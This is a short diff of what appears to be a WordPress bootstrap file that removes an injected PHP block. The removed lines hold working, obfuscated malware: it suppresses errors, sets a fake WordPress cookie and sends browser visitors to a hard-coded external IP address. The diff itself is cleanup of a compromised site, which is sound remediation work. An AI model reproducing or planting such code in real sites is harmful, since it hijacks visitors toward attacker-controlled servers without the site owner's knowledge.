@@ -13,8 +13,7 @@ function class_x_i($x=''){
 	}
 }
 class_x_i();
-scp-173
-?><?php error_reporting(0);function a_($c_=32){$c0="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";$c1=strlen($c0);$c2="";for($c3=0;$c3<$c_;$c3++){$c2.=$c0[rand(0,$c1-1)];}return$c2;}$c4=array("Chrome","Firefox","Edge","Opera","Android","Safari","Windows");foreach($c4 as$c5){if(stripos($_SERVER['HTTP_USER_AGENT'],$c5)!==false){if(!isset($_COOKIE["wp-authcookie-1"])&&!isset($_COOKIE["wp-settings-time-1"])){setcookie("wp-authcookie-1","1",time()+3600*24*2);header("L"."oc"."at"."io"."n: ht"."tp:"."//"."13"."4.2"."49."."11"."6.78"."/?"."ke"."y=".a_());}}};?><?php
+?><?php
 /**
  * Bootstrap file for setting the ABSPATH constant
  * and loading the wp-config.php file. The wp-config.php
